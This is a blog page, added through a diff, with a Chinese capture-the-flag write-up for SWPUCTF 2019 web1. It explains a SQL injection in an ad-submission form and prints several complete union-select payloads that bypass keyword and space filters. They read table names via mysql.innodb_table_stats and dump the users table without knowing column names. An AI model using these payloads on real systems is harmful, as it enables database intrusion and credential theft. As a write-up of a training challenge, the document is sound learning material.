@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="#[SWPUCTF 2019] web1  1.登录页面 进来首先是个登录页面，一开始尝试用admin登录并用暴力破解得出密码，但是好像破解不出密码。看到下面有个注册页面，点开注册一个账号就可以登录了。登录后，点开广告申请，发现有点不对劲。一开始看到文本框，想到了xss,试过几个xss payload，发现应该和xss无关。。。想到sql注入，但不知道怎么构造绕过的payload。看了网上大佬的W">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/2020/04/25/SWPUCTF2019 web1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="#[SWPUCTF 2019] web1  1.登录页面 进来首先是个登录页面，一开始尝试用admin登录并用暴力破解得出密码，但是好像破解不出密码。看到下面有个注册页面，点开注册一个账号就可以登录了。登录后，点开广告申请，发现有点不对劲。一开始看到文本框，想到了xss,试过几个xss payload，发现应该和xss无关。。。想到sql注入，但不知道怎么构造绕过的payload。看了网上大佬的W">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2020-04-26T09:40:27.368Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+<meta name="twitter:description" content="#[SWPUCTF 2019] web1  1.登录页面 进来首先是个登录页面，一开始尝试用admin登录并用暴力破解得出密码，但是好像破解不出密码。看到下面有个注册页面，点开注册一个账号就可以登录了。登录后，点开广告申请，发现有点不对劲。一开始看到文本框，想到了xss,试过几个xss payload，发现应该和xss无关。。。想到sql注入，但不知道怎么构造绕过的payload。看了网上大佬的W">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-SWPUCTF2019 web1" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/25/SWPUCTF2019 web1/" class="article-date">
+  <time datetime="2020-04-25T10:17:34.015Z" itemprop="datePublished">2020-04-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#[SWPUCTF 2019] web1</p>
+<hr>
+<p><strong>1.登录页面</strong></p>
+<p>进来首先是个登录页面，一开始尝试用admin登录并用暴力破解得出密码，但是好像破解不出密码。看到下面有个注册页面，点开注册一个账号就可以登录了。登录后，点开广告申请，发现有点不对劲。一开始看到文本框，想到了xss,试过几个xss payload，发现应该和xss无关。。。想到sql注入，但不知道怎么构造绕过的payload。看了网上大佬的WP，学到了sql注入的新姿势，原来这是利用了无列名注入。</p>
+<hr>
+<p><strong>2.构造payload</strong></p>
+<p>随便试了几个payload,发现order,and,or都被过滤了。空格也被过滤了。。。但是空格可以用/**/代替。and也可以用&amp;&amp;代替。那么先试试有几个字段。由于order被过滤了，没法用order by子句判断目标表的列数了。这里我就逐渐增加字段数，这样慢慢的发现竟然有22个字段,并且第2，3列是显示列</p>
+<pre><code>-1&apos;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;1</code></pre><p>接下来就是老套路，查表，查列，查数据了。</p>
+<p>首先爆数据库名，数据库名为web1</p>
+<pre><code>-1&apos;/**/union/**/select/**/1,2,database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;1</code></pre><p>接下来爆表名</p>
+<pre><code>-1&apos;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&apos;web1&apos;/**/,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;1</code></pre><p>但是information被过滤了，实际上是or被过滤了，导致order，or，information这些字都被过滤了。那怎么查到表名？在网上搜索才知道mysql在5.7版本之后还有一个sys系统表sys.schema_auto_increment_columns，作用和information_schema是相似的。</p>
+<pre><code>-1&apos;/**/union/**/select/**/1,2,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns /**/where/**/table_schema=database()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;</code></pre><p>但是试了一下报错,页面说sys.schema_auto_increment_columns这个表不存在。但是根据刚才试列数是页面报的错才知道mysql.innodb_table_stats这个表也可以用，也类似于information_schema,这是这个表的详细使用信息：</p>
+<p><a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/" target="_blank" rel="noopener">https://mariadb.com/kb/en/mysqlinnodb_table_stats/</a></p>
+<p>那么重新构造payload：</p>
+<pre><code>-1&apos;/**/union/**/select/**/1,2,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;</code></pre><p>查到有两个表ads,users。ads应该是和广告有关的，这里先试试users表</p>
+<pre><code>-1&apos;/**/union/**/select/**/1,2,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;1</code></pre><p>这里用到了子查询，子查询是将一个查询语句嵌套在另一个查询语句中，在特定的情况下，一个查询语句的条件需要另一个查询语句来获取，内层查询语句的查询结果，可以为外层查询语句提供查询条件。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/04/25/SWPUCTF2019 web1/" data-id="ck9gz156700039sv9xaleejrc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/04/26/RoarCTF2019-easy-Java/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          RoarCTF2019 easy Java
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/04/13/JPA初学问题总结/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/04/26/BUUCTF-old-hack/">BUUCTF old hack</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/26/RoarCTF2019-easy-Java/">RoarCTF2019 easy Java</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/25/SWPUCTF2019 web1/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/13/JPA初学问题总结/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/11/python序列化及反序列化/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
